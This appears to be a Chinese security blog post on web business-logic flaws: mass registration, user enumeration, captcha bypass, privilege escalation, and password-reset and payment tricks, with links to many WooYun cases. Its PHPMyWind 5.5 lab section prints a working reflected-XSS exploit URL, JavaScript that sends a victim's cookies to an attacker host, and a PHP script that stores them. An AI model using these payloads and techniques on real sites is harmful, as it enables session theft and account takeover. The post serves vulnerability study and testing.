+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174113.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<p>将数据包发送到repeater，每次修改username值，发现，只需要修改username值就可以注册成功用户，图形验证码无效，并且未对电话，邮箱等信息校验，可批量注册。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174335.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174408.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<h4 id="批量猜解用户">批量猜解用户</h4>
+<p>同样是注册功能，在输入用户名时，发现会提示用户名是否存在，猜测该位置可以猜测哪些用户注册过该网站。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121192039.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<p>抓取该位置数据包发现，会对用户名id进行判断，是否存在，是否符合规则，由此我们可以批量探测用户，发现可以批量探测已注册过的用户：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121191345.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<h4 id="任意密码重置">任意密码重置</h4>
+<p>在忘记密码功能，我们输入用户名正确后会进行短信验证码，通过手机验证码或者邮箱验证码。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121214403.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<p>在验证码功能中输入验证码进行验证，发现其中有一段JavaScript代码<code>document.userreg.yzm_mobile2.value=='no'</code>是用来验证验证码是否正确，那么就可以直接在控制台直接改变这个值就可以绕过验证码：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121221300.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200121221556274.png" alt="image-20200121221556274"></p>
+<h4 id="平行越权">平行越权</h4>
+<blockquote>
+<p>越权又可分为平行越权（相同用户）、垂直越权（低权限用户和高权限用户）、未授权访问（无需用户直接操作）。</p>
+</blockquote>
+<p>登录普通用户test2,查看用户敏感的页面：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122161744.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<p>发送到repteater数据包中，看到cookie中存在username参数，修改为已存在的用户名，发现返回包中可查看其他用户敏感信息。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122161815.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<h3 id="PHPMyWind-5-5">PHPMyWind 5.5</h3>
+<p>由于网上没有找到PHPMyWind5.5的源码，只能看看其他师傅分析的文章，这里就再大概复述一遍。</p>
+<p>首先对实验环境做一个简单说明：</p>
+<table>
+<thead>
+<tr>
+<th>服务器</th>
+<th>192.168.114.159</th>
+<th>部署有“PHPMyWind 5.5”</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>攻击机（safedog）</td>
+<td>192.168.114.1</td>
+<td>部署有能“收集PHPMyWind用户的Cookie”的PHP脚本、JS脚本</td>
+</tr>
+<tr>
+<td>受害者（victim）</td>
+<td>192.168.114.161</td>
+<td>可通过浏览器访问“服务器”上的“PHPMyWind”网站</td>
+</tr>
+</tbody>
+</table>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122150706.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<ol>
+<li>过程1代表攻击者safedog通过邮件等方式发送恶意链接（嵌有可盗取并发送Cookie的JS脚本）给受害者victim；</li>
+<li>过程2代表在受害者victim受诱导点击恶意链接后，会经由浏览器将攻击者safedog嵌入的JS脚本当做数据发送给服务器上的PHPMyWind网站的反射型XSS漏洞点；</li>
+<li>过程3与过程4代表PHPMyWind网站在受到反射型XSS攻击后，会执行JS脚本，将受害者victim的Cookie返回给受害者victim，并发送给攻击者safedog。</li>
+<li>过程5代表攻击者safedog在获得受害者victim的Cookie后，利用受害者victim的Cookie与PHPMyWind网站的逻辑漏洞点进行密码重置攻击。</li>
+</ol>
+<h4 id="反射型XSS">反射型XSS</h4>
+<p>攻击者搭建可接收受害者Cookie的PHP网站；</p>
+<p>该PHP网站由“ReflectiveXSS.js”“ReflectiveXSS.php”和“cookie.txt”这3个文件构成。</p>
+<p>其中“ReflectiveXSS.js”用于针对服务器端PHPMyWind网站的反射型XSS漏洞窃取受害者victim的Cookie，并将该Cookie值传输给ReflectiveXSS.php；“ReflectiveXSS.php”用于接收名为“victimcookie”的GET请求，并将“victimcookie”的参数值保存到“cookie.txt”。</p>
+<p>ReflectiveXSS.js的代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过指定的名称&#x27;img&#x27;创建img元素</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">img.width = <span class="number">0</span>;</span><br><span class="line">img.height = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将img元素的src属性指向脚本文件ReflectiveXSS.php</span></span><br><span class="line"><span class="comment">//将cookie信息的字符串作为URI组件进行编码，然后用victimcookie参数传递</span></span><br><span class="line">img.src = <span class="string">&#x27;http://192.168.114.1/safedog-attack/ReflectiveXSS.php?victimcookie=&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure>
+<p>ReflectiveXSS.php的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;victimcookie&#x27;</span>];</span><br><span class="line">    $filePath = <span class="string">&quot;cookie.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_writable($filePath)==<span class="literal">false</span>)&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;can&#x27;t write&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          $handler = fopen($filePath, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">          fwrite($handler, $str);</span><br><span class="line">          fclose($handler);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>出发XSS漏洞的EXP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.114.159&#x2F;phpmywind5-5&#x2F;data&#x2F;api&#x2F;oauth&#x2F;connect.php?method&#x3D;unknownmethod&lt;script src&#x3D;http:&#x2F;&#x2F;192.168.114.1&#x2F;safedog-attack&#x2F;ReflectiveXSS.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>出现XSS漏洞的地方：</p>
+<p>该漏洞出现的文件路径为：/data/api/oauth/connect.php，其中的代码段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(method_exists($connect, $method))</span><br><span class="line">    $connect-&gt;method();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请求的方法[&quot;</span> . $method . <span class="string">&quot;不存在&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>if判断的作用是“判断函数名是否存在”，代码的逻辑是“如果函数名不存在，则在PHP页面输出函数名”，这一做法会造成反射型XSS漏洞。</p>
+<h4 id="任意密码重置-v2">任意密码重置</h4>
+<p>该漏洞出现的文件路径为：/member.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检测旧密码是否正确</span></span><br><span class="line"><span class="keyword">if</span>($password != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $oldpassword = md5(md5($oldpassword));</span><br><span class="line">    $r = $dosql-&gt;GetOne(<span class="string">&quot;SELECT `password` FROM `#@__member` WHERE `username`=&#x27;<span class="subst">$c_uname</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>($r[<span class="string">&#x27;password&#x27;</span>] != $oldpassword)</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(msg: <span class="string">&#x27;抱歉，旧密码错误！&#x27;</span>, gourl: <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;UPDATE `#@__member` SET&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($password != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $password = md5(md5($password));</span><br><span class="line">    $sql .= <span class="string">&quot;password=&#x27;<span class="subst">$password</span>&#x27;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@$sql .= <span class="string">&quot;question=&#x27;<span class="subst">$question</span>&#x27;, answer=&#x27;<span class="subst">$answer</span>&#x27;, cnname=&#x27;<span class="subst">$cnname</span>&#x27;, enname=&#x27;<span class="subst">$enname</span>&#x27;, sex=&#x27;<span class="subst">$sex</span>&#x27;, birthtype=&#x27;<span class="subst">$birthtype</span>&#x27;, birth_year=&#x27;<span class="subst">$birth_year</span>&#x27;, birth_month=&#x27;<span class="subst">$birth_month</span>&#x27;, birth_day=&#x27;<span class="subst">$birth_day</span>&#x27;, astro=&#x27;<span class="subst">$astro</span>&#x27;, bloodtype=&#x27;<span class="subst">$bloodtype</span>&#x27;, trade=&#x27;<span class="subst">$trade</span>&#x27;, live_prov=&#x27;<span class="subst">$live_prov</span>&#x27;, live_city=&#x27;<span class="subst">$live_city</span>&#x27;, live_country=&#x27;<span class="subst">$live_country</span>&#x27;, home_prov=&#x27;<span class="subst">$home_prov</span>&#x27;, home_city=&#x27;<span class="subst">$home_city</span>&#x27;, home_country=&#x27;<span class="subst">$home_country</span>&#x27;, cardtype=&#x27;<span class="subst">$cardtype</span>&#x27;, cardnum=&#x27;<span class="subst">$cardnum</span>&#x27;, intro=&#x27;<span class="subst">$intro</span>&#x27;, email=&#x27;<span class="subst">$email</span>&#x27;, qqnum=&#x27;<span class="subst">$qqnum</span>&#x27;, mobile=&#x27;<span class="subst">$mobile</span>&#x27;, telephone=&#x27;<span class="subst">$telephone</span>&#x27;, address_prov=&#x27;<span class="subst">$address_prov</span>&#x27;, address_city=&#x27;<span class="subst">$address_city</span>&#x27;, address_country=&#x27;<span class="subst">$address_country</span>&#x27;, address=&#x27;<span class="subst">$address</span>&#x27;, zipcode=&#x27;<span class="subst">$zipcode</span>&#x27; WHERE id=&#x27;<span class="subst">$id</span>&#x27; AND `username`=&#x27;<span class="subst">$c_uname</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($dosql-&gt;ExecNoneQuery($sql))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(msg: <span class="string">&#x27;资料更新成功&#x27;</span>, gourl: <span class="string">&#x27;?c=edit&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一个if判断的作用是“判断用户提交的新密码是否为空”，在用户提交的新密码不为空的情况下，才会进行‘旧密码的比对’，如果提交的旧密码和数据库的查询结果不一致，则不允许继续进行更换密码的操作。第二个if判断的作用仍为“判断用户提交的新密码是否为空”，在用户提交的新密码不为空的情况下，对新密码进行哈希运算，随后进行SQL语句的拼接。这两个if语句存在了逻辑漏洞。因为，如果我们提交的新密码（password变量和repassword变量）为空，则可以绕过对旧密码（oldpassword变量）的验证。</p>
+<p>在这里之所以要使用XSS获取cookie，是因为当SQL语句满足条件<code>id='$id' AND username ='$c_uname';</code>时，才可进行update操作。变量<code>c_uname</code>值（明文）来源于<code>AuthCode($_COOKIE['username'])</code>，即先取得Cookie中username(密文)的值，然后通过AuthCode函数配合配置文件中的密钥来获取明文。</p>
+<p>PHPMyWind采用Cookie保存混淆化的用户登录信息。因为配置文件中的密钥是在CMS搭建时随机生成的，算法也不可逆，因此要在知道c_name变量的前提下，从正向伪造username等变量，以通过权限验证具有较大难度。为获取Cookie中的username等值，可考虑借助反射型XSS漏洞。</p>
+<h3 id="其他实例">其他实例</h3>
+<p>现在wooyun已经没了，只能在一些镜像网站看漏洞合集，以<code>逻辑漏洞</code>为关键词搜索到了186个相关漏洞，基本上把每个漏洞都过了一遍，也没办法复现，记录一些比较有代表性的案例，权当搜集思路吧。</p>
+<h4 id="支付业务相关逻辑漏洞">支付业务相关逻辑漏洞</h4>
+<h5 id="常见手法">常见手法</h5>
+<ul>
+<li>修改金额；</li>
+<li>修改商品数量；</li>
+<li>修改优惠金额；</li>
+<li>修改数量、单价，优惠价格参数为负数、小数，无限大；</li>
+<li>商品价格更改；</li>
+<li>支付key泄露等。</li>
+</ul>
+<p>实际安全中会有一些比较特别的，反正各种能改的参数都去尝试。个数<em>单价-优惠券个数</em>单价=总额，每个值都可能存在问题，就看服务自身处理是否有问题了。</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2011-02272.html">顺丰宝业务逻辑漏洞</a>：数量和金额没有做签名</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2011-02513.html">移动手机支付业务逻辑漏洞</a>：爆破四位验证码</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-019761.html">新东方逻辑支付漏洞</a>：修改运费金额为负数，使得课程金额+运费大于0即可</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-074483.html">中国零食网支付逻辑漏洞</a>：同上</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-023789.html">阿里云计算按量付费逻辑漏洞一枚（低价享受超级主机）</a>：经过base64编码的数据可以被篡改，并且后端会接受篡改的数据</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-036787.html">乐视商城支付逻辑漏洞（价格可更改）</a>：价格参数明文显示在url，可以直接更改</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053181.html">再次挖掘乐视商城支付逻辑漏洞</a>：同上</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-051673.html">读览天下支付逻辑漏洞可刷充值金额</a>：替换支付订单号</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-093365.html">益盟爱炒股商城支付逻辑漏洞</a>：修改Cookie中的参数值</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0125060.html">饿了么逻辑漏洞之免费吃喝不是梦</a>：<code>手机号+;+手机号</code>绕过服务器对手机号码的次数限制</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0135459.html">七夕单身专场之性多多免费刷成人用品(支付逻辑漏洞)</a>：改负数刷代币</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0194751.html">大疆某处支付逻辑漏洞可1元买无人机</a>：https改为http访问，修改支付的参数</p>
+<h4 id="密码找回相关逻辑漏洞">密码找回相关逻辑漏洞</h4>
+<h5 id="常见手法-v2">常见手法</h5>
+<ul>
+<li>
+<p>找回密码的验证码为四位数字可爆破真实验证码；</p>
+</li>
+<li>
+<p>采用本地验证,可以先尝试修改自己的帐号密码，保存正确的返回包，然后修改他人密码的时候替换返回包；</p>
+</li>
+<li>
+<p>最终修改密码的数据包，以另外的ID作为身份判断（例如userid），而该ID在别处可以获取到；</p>
+</li>
+<li>
+<p>接受验证码的手机号修改为自己的号码，然后输入自己的号码接收到的验证码去进行密码重置；</p>
+</li>
+<li>
+<p>获取验证码的时候，会生成一个身份标识（例如cookie值），那么我们就替换他人账号的身份证重置他人的密码；</p>
+</li>
+</ul>
+<p>具体可以去i春秋看carry_your发过的一篇专门针对<a target="_blank" rel="noopener" href="https://www.ichunqiu.com/course/59045">密码重置的视频</a>。</p>
+<p><strong>用户凭证暴力破解</strong></p>
+<p>四位或者六位的纯数字</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-011833.html">WooYun: 当当网任意用户密码修改漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-011720.html">WooYun: 微信任意用户密码修改漏洞</a></p>
+<p><strong>返回凭证</strong></p>
+<p>url返回验证码及token</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-05630.html">WooYun: 走秀网秀团任意密码修改缺陷</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-058210.html">WooYun: 天天网任意账户密码重置（二）</a></p>
+<p><strong>密码找回凭证在页面中</strong></p>
+<p>通过密保问题找回密码</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-04728.html">WooYun: sohu邮箱任意用户密码重置</a></p>
+<p><strong>返回短信验证码</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-085124.html">WooYun: 新浪某站任意用户密码修改（验证码与取回逻辑设计不当）</a></p>
+<p><strong>邮箱弱token</strong></p>
+<p>时间戳的md5</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-08333.html">WooYun: 奇虎360任意用户密码修改漏洞</a></p>
+<p><strong>用户名 &amp; 服务器时间</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-090226.html">WooYun: 中兴某网站任意用户密码重置漏洞（经典设计缺陷案例）</a></p>
+<p><strong>用户凭证有效性</strong></p>
+<p>短信验证码</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053349.html">WooYun: OPPO手机重置任意账户密码（3）</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053079.html">WooYun: 第二次重置OPPO手机官网任意账户密码（秒改）</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020032.html">WooYun: OPPO修改任意帐号密码</a></p>
+<p><strong>邮箱token</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-012572.html">WooYun: 身份通任意密码修改-泄漏大量公民信息</a></p>
+<p><strong>重置密码token</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-078208.html">WooYun: 魅族的账号系统内存在漏洞可导致任意账户的密码重置</a></p>
+<p><strong>重新绑定</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-08307.html">WooYun: 网易邮箱可直接修改其他用户密码</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115537.html">WooYun: 如家酒店某严重逻辑漏洞可登陆任意账号可导致几千万敏感信息泄露（涉及任意用户账号个人基本信息、入住记录等）</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115276.html">Wooyun: 华住酒店官网某严重逻辑漏洞可登陆任意账号（涉及任意用户账号个人基本信息、入住记录等）</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-081467.html">WooYun: 12308可修改任意用户密码</a></p>
+<p><strong>邮箱绑定</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-092319.html">WooYun: 某彩票设计缺陷可修改任意用户密码</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-086726.html">WooYun: 中国工控网任意用户密码重置漏洞</a></p>
+<p><strong>服务器验证</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-018263.html">WooYun: 携程旅行网任意老板密码修改(庆在wooyun第100洞)</a></p>
+<p><strong>服务器验证可控内容</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-080278.html">WooYun: AA拼车网之任意密码找回2</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-082582.html">WooYun: 四川我要去哪517旅行网重置任意账号密码漏洞</a></p>
+<p><strong>服务器验证验证逻辑为空</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-088927.html">WooYun: 某政企使用邮件系统疑似存在通用设计问题</a></p>
+<p><strong>用户身份验证</strong></p>
+<p>账号与手机号码的绑定</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-075941.html">WooYun: 上海电信通行证任意密码重置</a></p>
+<p><strong>账号与邮箱账号的绑定</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-078208.html">WooYun: 魅族的账号系统内存在漏洞可导致任意账户的密码重置</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-091216.html">WooYun: 和讯网修改任意用户密码漏洞</a></p>
+<p><strong>找回步骤</strong></p>
+<p>跳过验证步骤、找回方式，直接到设置新密码页面</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042404.html">WooYun: OPPO手机同步密码随意修改，短信通讯录随意查看</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-098765.html">WooYun: 中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p>
+<p><strong>本地验证</strong></p>
+<p>在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回信息是可控的内容，或者可以得到的内容</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-083035.html">WooYun: 看我如何重置乐峰网供应商管理系统任意用户密码（管理员已被重置）</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-069987.html">WooYun: oppo重置任意用户密码漏洞(4)</a></p>
+<p><strong>发送短信等验证信息的动作在本地进行，可以通过修改返回包进行控制</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020532.html">WooYun: OPPO修改任意帐号密码-3</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020425.html">WooYun: OPPO修改任意帐号密码-2</a></p>
+<p><strong>注入</strong></p>
+<p>在找回密码处存在注入漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-068060.html">WooYun: 用友人力资源管理软件（e-HR）另一处SQL注入漏洞（通杀所有版本）</a></p>
+<p><strong>Token生成</strong></p>
+<p>token生成可控</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-094242.html">WooYun: 天天网任意账号密码重置(非暴力温柔修改)</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-095729.html">WooYun: 天天网再一次重置任意账号密码(依旧非暴力)</a></p>
+<p><strong>注册覆盖</strong></p>
+<p>注册重复的用户名</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-088708.html">WooYun: 中铁快运奇葩方式重置任意用户密码(admin用户演示)</a></p>
+<p><strong>session覆盖</strong></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-085843.html">WooYun: 聚美优品任意修改用户密码(非爆破)</a></p>
+<h4 id="越权相关逻辑漏洞">越权相关逻辑漏洞</h4>
+<p>越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。</p>
+<h5 id="常见手法-v3">常见手法</h5>
+<ul>
+<li>操作时分析请求中的数据包，看看每个参数的作用，修改参数查看变化。</li>
+<li>拥有更多权限的账号，把能访问的URL都提取出来，给低权限用户访问或者直接访问，查看能否访问。</li>
+<li>猜测隐藏的API，如:guest/getorder，修改成admin/getorder。</li>
+<li>通过搜索引擎，或者提取JS中的URL，查找隐藏功能。如burpsuite中有一个BHP JS scraper的插件。</li>
+<li>猜测隐藏的参数，添加进去查看变化，如修改信息的时候加个ID。</li>
+<li>抓取所有的数据包，搜索用户名等关键词，比如我的用户名是test，在burpsuite中的HTTP history搜索test，看看有没有哪个数据包包含这个参数,将其修改为其他的用户名，查看变化。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-CWizFUofM78DkvymqEHiA">JSRC——越权漏洞挖掘</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/1mapo4wno1uMctrIEJwKvQ">JSRC——聊聊越权那些事</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/drops/tips-727.html">我的越权之道</a></p>
+<p>垂直越权的手法：</p>
+<ul>
+<li>
+<p>编辑个人信息的时候，修改权限组的id，一般管理员的值为0或者1；</p>
+</li>
+<li>
+<p>后台修改密码的地方，如果是根据userid来修改密码的，可以修改id的值来修改管理员的密码；</p>
+</li>
+<li>
+<p>在个人资料处插入XSS脚本，一般能打到管理员cookie的概率很大；</p>
+</li>
+<li>
+<p>查看个人资料的时候，如果是根据id来显示，一般都有越权，可以遍历id获取管理员信息；</p>
+</li>
+<li>
+<p>测试后台功能，找一下注入、上传、命令执行等漏洞，直接拿下数据库权限或者shell，再找管理员权限就轻而易举了。</p>
+</li>
+</ul>
+<h3 id="其他资料">其他资料</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/PyxYuYu/MyBlog/issues/102">业务逻辑漏洞总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-r1oWQb_oS8jEMdJs9Ct_g">JSRC——业务逻辑漏洞挖掘</a></p>
